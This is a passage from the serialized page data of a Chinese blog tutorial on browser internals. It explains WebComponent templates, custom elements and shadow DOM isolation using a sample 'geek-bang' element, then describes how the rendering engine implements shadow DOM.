class="gatsby-code-button-container"\n              data-toaster-id="23496493444239385000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<!DOCTYPE html>\n<html>\n  <body>\n    <!--\n      一：定义模板\n      二：定义内部 CSS 样式\n      三：定义 JavaScript 行为\n    -->\n    <template id=&quot;geekbang-t&quot;>\n      <style>\n        p {\n          background-color: brown;\n          color: cornsilk;\n        }\n\n        div {\n          width: 200px;\n          background-color: bisque;\n          border: 3px solid chocolate;\n          border-radius: 10px;\n        }\n      </style>\n      <div>\n        <p>time.geekbang.org</p>\n        <p>time1.geekbang.org</p>\n      </div>\n      <script>\n        function foo() {\n          console.log(\'inner log\');\n        }\n      </script>\n    </template>\n    <script>\n      class GeekBang extends HTMLElement {\n        constructor() {\n          super();\n          // 获取组件模板\n          const content = document.querySelector(\'#geekbang-t\').content;\n          // 创建影子 DOM 节点\n          const shadowDOM = this.attachShadow({ mode: \'open\' });\n          // 将模板添加到影子 DOM 上\n          shadowDOM.appendChild(content.cloneNode(true));\n        }\n      }\n      customElements.define(\'geek-bang\', GeekBang);\n    </script>\n\n    <geek-bang></geek-bang>\n    <div>\n      <p>time.geekbang.org</p>\n      <p>time1.geekbang.org</p>\n    </div>\n    <geek-bang></geek-bang>\n  </body>\n</html>`, `23496493444239385000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                html 复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>\n    <span class="token comment">&lt;!--\n      一：定义模板\n      二：定义内部 CSS 样式\n      三：定义 JavaScript 行为\n    --></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>geekbang-t<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">\n        <span class="token selector">p</span> <span class="token punctuation">{</span>\n          <span class="token property">background-color</span><span class="token punctuation">:</span> brown<span class="token punctuation">;</span>\n          <span class="token property">color</span><span class="token punctuation">:</span> cornsilk<span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n\n        <span class="token selector">div</span> <span class="token punctuation">{</span>\n          <span class="token property">width</span><span class="token punctuation">:</span> 200px<span class="token punctuation">;</span>\n          <span class="token property">background-color</span><span class="token punctuation">:</span> bisque<span class="token punctuation">;</span>\n          <span class="token property">border</span><span class="token punctuation">:</span> 3px solid chocolate<span class="token punctuation">;</span>\n          <span class="token property">border-radius</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n      </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>\n        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>time.geekbang.org<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>\n        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>time1.geekbang.org<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">\n        <span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n          console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">\'inner log\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n      </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">\n      <span class="token keyword">class</span> <span class="token class-name">GeekBang</span> <span class="token keyword">extends</span> <span class="token class-name">HTMLElement</span> <span class="token punctuation">{</span>\n        <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n          <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n          <span class="token comment">// 获取组件模板</span>\n          <span class="token keyword">const</span> content <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">\'#geekbang-t\'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">;</span>\n          <span class="token comment">// 创建影子 DOM 节点</span>\n          <span class="token keyword">const</span> shadowDOM <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">attachShadow</span><span class="token punctuation">(</span><span class="token punctuation">{</span> mode<span class="token punctuation">:</span> <span class="token string">\'open\'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n          <span class="token comment">// 将模板添加到影子 DOM 上</span>\n          shadowDOM<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>content<span class="token punctuation">.</span><span class="token function">cloneNode</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n      <span class="token punctuation">}</span>\n      customElements<span class="token punctuation">.</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">\'geek-bang\'</span><span class="token punctuation">,</span> GeekBang<span class="token punctuation">)</span><span class="token punctuation">;</span>\n    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>\n\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>geek-bang</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>geek-bang</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>time.geekbang.org<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>time1.geekbang.org<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>geek-bang</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>geek-bang</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>详细观察上面这段代码，我们可以得出：要使用 WebComponent，通常要实现下面三个步骤。</p>\n<p>首先，使用 template 属性来创建模板。利用 DOM 可以查找到模板的内容，但是模板元素是不会被渲染到页面上的，也就是说 DOM 树中的 template 节点不会出现在布局树中，所以我们可以使用 template 来自定义一些基础的元素结构，这些基础的元素结构是可以被重复使用的。一般模板定义好之后，我们还需要在模板的内部定义样式信息。</p>\n<p>其次，我们需要创建一个 GeekBang 的类。在该类的构造函数中要完成三件事：</p>\n<ul>\n<li>查找模板内容；</li>\n<li>创建影子 DOM；</li>\n<li>再将模板添加到影子 DOM 上</li>\n</ul>\n<p>上面最难理解的是影子 DOM，其实影子 DOM 的作用是将模板中的内容与全局 DOM 和 CSS 进行隔离，这样我们就可以实现元素和样式的私有化了。你可以把影子 DOM 看成是一个作用域，其内部的样式和元素是不会影响到全局的样式和元素的，而在全局环境下，要访问影子 DOM 内部的样式或者元素也是需要通过约定好的接口的。</p>\n<p>总之，通过影子 DOM，我们就实现了 CSS 和元素的封装，在创建好封装影子 DOM 的类之后，我们就可以使用 <code class="language-text">customElements.define</code> 来自定义元素了（可参考上述代码定义元素的方式）。</p>\n<blockquote>\n<p>最后，就很简单了，可以像正常使用 HTML 元素一样使用该元素，如上述代码中的 <code class="language-text">&lt;geek-bang&gt;&lt;/geek-bang&gt;</code>。</p>\n</blockquote>\n<p>上述代码最终渲染出来的页面，如下图所示：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-13-11-51-51-075e14c217ffe70c86539ac84710a79f-62dab.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 87.68768768768768%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAIAAADUsmlHAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAC5klEQVQ4y42U208TQRTG+TssUGjpttsLbLvttt1uu9uuhdC3LlTik5oQ3vVFHzQmBoNGBY0gCqIiiYiiYDBeokFCiEQMkRaBShrAxHLb3qtg6HbqtEahKNGT2ZeZ/M53zndmtiANMgBk/gy4n0gkwuHwOs+HQiGe52OxWCQSicfj4BdQAL/lqbHp/htzQ3dnn9yZGbw9df/a4ujTNAANDQ0WksSwCo1Go1KpHA4HQRAejwfykIIpsvD8q4E3l06+vX5urO3sSMvpwWP17242w4I8dXVqTI9pdUq1pjQbEpFIRJJkNBrdhpfGnk90NHnvtX7ouTLZ3TJ8/oTvYSes7NDhI3qrg7I7LTZGq9PhOA71XS4XrH8b/hYPR1cWY6tL8bXPX8PBrSQvbCbS6XRNradYLEYVCjmCGI1Gk9mMIHK73Z6nHApHPwUW5wMLgYWllVU+k7NDEASOq90nKpQhcoVCiet0RkIPm3c6nXlwMhkP8cvra1/49eVYjAdAgEdQ2e3mEFRlZasMJovFZKLNBkQqsdFMHhx8PzzV0zL7qPPjg3Zvb+t4e6P/WS+U57gaGaom2WotYdFgOlSlLiosstlsebD/Zf/rpuOjVxtHLp8Zvnjq8dH68Y5muA+V5SqNbX+1gbRiuF6L60tKSnbDwckRX1/b3FD37OCtmYGuia4L8y/6QA4ulUgptspEs4TFptMTUqmUZdk8t0F6KyNsgNRGJrUBhE0Avuf8SsOyy1C1gWIwg1GpUisUCpiLpuk85V3x8/ZBwzg3VyyRkVaGspAOlrVSVDlOMHY2Go3shMHOBUA6OyoIc5xcXWFmnBhuQJUonBO8Zbt73kvZDd2WyeyVLpJmTRRjJCmpRAJveF7Pe8AChKUIamIqcZLOjkqplPwnDB07UHdQqTWWa3EEQWRlZYhcLhaL/2HY7xSBQMDr9U37cisXPp/P7/fDvNvveWfAg2AwCB89/BMkk8lYLlKp1F8FfgDWJ+OPjhOz2AAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 13 11 51 51"\n        title=""\n        src="/static/2021-07-13-11-51-51-075e14c217ffe70c86539ac84710a79f-fee1c.png"\n        srcset="/static/2021-07-13-11-51-51-075e14c217ffe70c86539ac84710a79f-a67b7.png 200w,\n/static/2021-07-13-11-51-51-075e14c217ffe70c86539ac84710a79f-0b187.png 400w,\n/static/2021-07-13-11-51-51-075e14c217ffe70c86539ac84710a79f-fee1c.png 800w,\n/static/2021-07-13-11-51-51-075e14c217ffe70c86539ac84710a79f-b1a91.png 1200w,\n/static/2021-07-13-11-51-51-075e14c217ffe70c86539ac84710a79f-62dab.png 1332w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>从图中我们可以看出，影子 DOM 内部的样式是不会影响到全局 CSSOM 的。另外，使用 DOM 接口也是无法直接查询到影子 DOM 内部元素的，比如你可以使用 document.getElementsByTagName(‘div’)来查找所有 div 元素，这时候你会发现影子 DOM 内部的元素都是无法查找的，因为要想查找影子 DOM 内部的元素需要专门的接口，所以通过这种方式又将影子内部的 DOM 和外部的 DOM 进行了隔离。</p>\n<p>通过影子 DOM 可以隔离 CSS 和 DOM，不过需要注意一点，影子 DOM 的 JavaScript 脚本是不会被隔离的，比如在影子 DOM 定义的 JavaScript 函数依然可以被外部访问，这是因为 JavaScript 语言本身已经可以很好地实现组件化了。</p>\n<h2 id="浏览器如何实现影子-dom"><a href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E5%BD%B1%E5%AD%90-dom" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>浏览器如何实现影子 DOM</h2>\n<p>关于 WebComponent 的使用方式我们就介绍到这里。WebComponent 整体知识点不多，内容也不复杂，我认为核心就是影子 DOM。上面我们介绍影子 DOM 的作用主要有以下两点：</p>\n<ul>\n<li>影子 DOM 中的元素对于整个网页是不可见的；</li>\n<li>影子 DOM 的 CSS 不会影响到整个网页的 CSSOM，影子 DOM 内部的 CSS 只对内部的元素起作用。</li>\n</ul>\n<p>那么浏览器是如何实现影子 DOM 的呢？下面我们就来分析下，如下图：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-13-11-52-29-b6fd9f3ed0845c4a5c2401ea8e2df156-74b04.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 73.4877734877735%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAIAAABr+ngCAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACwUlEQVQoz22R2U8TURTG+zeZ+GxUxGiqxu0BlaCR8ESMbyQ8mZiYGMRQYFrazkAtKQIq1CKCkc0EgQJFutCFwnSh03am69yZztK5d+pQeEDply83595zfsk95+hqdama1WMj9fgKJNWTghmAtBiqp9mT1FnpzsRIPZYGoDynfN4BoYykxUhVtLPu/2mdWn85zCnj7mIgVfm5x05vFzZJfmqL2Yiyrj/lCXd+/bAys1uaD/BQbQQni8pCqHJUVj3J6uqBGM7CpYgQZtTlEJjzlXwpaY2U3HEZoX/hk058VBX7xe5SyoxfsG/wogxrUMwC9MUDlsLCrJ9XFQkheO7b9W55CaZZBQgwz0MaIEmuikIFiDBIVWJ5OZLmRVFQFOV0KKdWdbVGUiCCUDkqobFt0RWqzYRqclVB6PzAEALkBthfZsPLkVAoEIkHwwdF/3x2c1LKx2BVBtHVCrmWCazs70ejZCIRDXKRRRBeVPiCDilSytFOmW8mhvSjhHlgZMpK2OMmfbznQskzKYPcEX43i98KWp5YbJOGEdcnoi9lbEoMNvHxLQ2WM442xngpYb5jxe29hGsAn0ha72UNF1nvtMQyaVMzY7ocMLe+w51vie+jhIk2X88MNfMJj66mCGHHywXsBWnS+0wtTqx7B3vsH3q08P5p2euEbNprblvFOmLYjTWs3TXYFTbe9xhb3cbnQnJbg7lNxyucsKett0nLAwwfj1pbPERn/4Cx4HXV2Pgc8frjiKVkveK2dpoIR8ly9Rv+5oMFkxNuDQa/x3sGbc44/jCIPzOM/vARHesjXQbLGOOd02DncC9hc+Qs11aI7n77LGXVf7X1DRM2MbGl0zbG56linhbogwpDFgo5nolxuWSOTktcEVaFAkUW6ZSU2WOzMYZmhEyoRCcLNAUlrvGeNcmyzPEVFnBlwKmq2rDmL1hP+73t5BMCAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 13 11 52 29"\n        title=""\n        src="/static/2021-07-13-11-52-29-b6fd9f3ed0845c4a5c2401ea8e2df156-fee1c.png"\n        srcset="/static/2021-07-13-11-52-29-b6fd9f3ed0845c4a5c2401ea8e2df156-a67b7.png 200w,\n/static/2021-07-13-11-52-29-b6fd9f3ed0845c4a5c2401ea8e2df156-0b187.png 400w,\n/static/2021-07-13-11-52-29-b6fd9f3ed0845c4a5c2401ea8e2df156-fee1c.png 800w,\n/static/2021-07-13-11-52-29-b6fd9f3ed0845c4a5c2401ea8e2df156-b1a91.png 1200w,\n/static/2021-07-13-11-52-29-b6fd9f3ed0845c4a5c2401ea8e2df156-74b04.png 1554w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>该图是上面那段示例代码对应的 DOM 结构图，从图中可以看出，我们使用了两次 geek-bang 属性，那么就会生成两个影子 DOM，并且每个影子 DOM 都有一个 shadow root 的根节点，我们可以将要展示的样式或者元素添加到影子 DOM 的根节点上，每个影子 DOM 你都可以看成是一个独立的 DOM，它有自己的样式、自己的属性，内部样式不会影响到外部样式，外部样式也不会影响到内部样式。</p>\n<p>浏览器为了实现影子 DOM 的特性，在代码内部做了大量的条件判断，比如当通过 DOM 接口去查找元素时，渲染引擎会去判断 geek-bang 属性下面的 shadow-root 元素是否是影子 DOM，如果是影子 DOM，那么就直接跳过 shadow-root 元素的查询操作。所以这样通过 DOM API 就无法直接查询到影子 DOM 的内部元素了。</p>\n<p>另外，当生成布局树的时候，渲染引擎也会判断 geek-bang 属性下面的 shadow-root 元素是否是影子 DOM，如果是，那么在影子 DOM 内部元素的节点选择 CSS 样式的时候，会直接使用影子 DOM 内部的 CSS 属性。所以这样最终渲染出来的效果就是影子 DOM 内部定义的样式。</p>\n<h2 id="总结-7"><a href="#%E6%80%BB%E7%BB%93-7" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>总结</h2>\n<p>首先，我们介绍了组件化开发是程序员的刚需，所谓组件化就是功能模块要实现高内聚、低耦合的特性。不过由于 DOM 和 CSSOM 都是全局的，所以它们是影响了前端组件化的主要元素。基于这个原因，就出现 WebComponent，它包含自定义元素、影子 DOM 和 HTML 模板三种技术，使得开发者可以隔离 CSS 和 DOM。在此基础上，我们还重点介绍了影子 DOM 到底是怎么实现的。</p>\n<p>关于 WebComponent 的未来如何，这里我们不好预测和评判，但是有一点可以肯定，WebComponent 也会采用渐进式迭代的方式向前推进，未来依然有很多坑需要去填</p>',
excerpt:"页面性能分析：利用 chrome 做 web…",frontmatter:{date:"2021-07-07 09:41:05",path:"/browser-working-principle-page/",tags:"前端, 浏览器, 高级前端",title:"浏览器工作原理与实践——浏览器中的页面",draft:null}},prePost:null},pathContext:{mainPostPath:"/browser-working-principle-network/",nextPostPath:"/browser-working-principle-page/",prePostPath:"none"}}}});